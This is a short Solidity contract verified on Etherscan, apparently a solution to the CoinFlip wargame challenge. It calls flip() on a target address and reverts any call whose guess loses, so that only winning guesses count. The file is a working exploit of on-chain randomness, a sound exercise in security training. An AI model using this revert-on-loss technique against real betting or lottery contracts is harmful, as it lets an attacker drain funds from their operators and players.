/**
 *Submitted for verification at Etherscan.io on 2023-06-13
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface CoinFlip {
  function flip(bool _guess) external returns (bool);
  function consecutiveWins() external view returns (uint256);
}

contract Solve {
    address public constant target = 0x58fb825d0BDAE37D62697B62ad8d80B851DA7B57;
    
    function solve() external {
      try this.wrappedSolve(true) {
      } catch {
        try this.wrappedSolve(false) {
        } catch {
          revert("both reverted");
        }
      }
    }

    function wrappedSolve(bool val) public {
      bool retVal = CoinFlip(target).flip(val);
      require(retVal);
    }
}